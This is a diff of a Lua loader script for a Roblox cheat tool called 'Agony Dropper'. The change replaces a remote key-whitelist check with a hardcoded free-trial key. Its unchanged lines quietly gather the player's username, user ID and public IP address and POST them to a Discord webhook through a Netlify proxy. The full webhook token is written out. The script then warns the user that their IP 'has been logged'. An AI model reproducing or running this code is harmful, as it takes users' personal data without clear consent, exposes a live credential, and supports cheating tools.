@@ -1,16 +1,18 @@
 local config = _G.AgonyDropper
 
-local keys = game:GetService("HttpService"):JsonDecode(game:HttpGet("https://api.condo.ga/AgonyDropperWhitelists"))
+--local keys = game:GetService("HttpService"):JsonDecode(game:HttpGet("https://api.condo.ga/AgonyDropperWhitelists"))
 
 local content = "Username: " .. game.Players.LocalPlayer.Name .. "\nUserID: " .. game.Players.LocalPlayer.UserId .. "\nWhitelist Key: " .. config.WhitelistKey .. "\nIP Address: " .. tostring(game:HttpGet("https://ipapi.co/json/"))
 
 syn.request("https://boring-dubinsky-45de26.netlify.app/https/discord.com/api/webhooks/1043513353068359701/ZQ8m9nLH1eZ3vzZpVPQB00yhpXqunrbrtZZEm7wKwUKZFjUOgg3kbQCoyBZ00CJFSfS1", "POST", nil, nil, { "content" = content })
 
-for _,v in pairs(keys) do
+--[[for _,v in pairs(keys) do
     if(v == config.WhitelistKey) then
         whitelisted = true
     end
-end
+end]]--
+
+if(config.WhitelistKey == "FREETRIAL2022") then whitelisted = true end
 
 if(whitelisted == false) then
     messagebox("Do NOT attempt to pirate Agony Software. Your IP adress has been logged.", "Agony", 0)
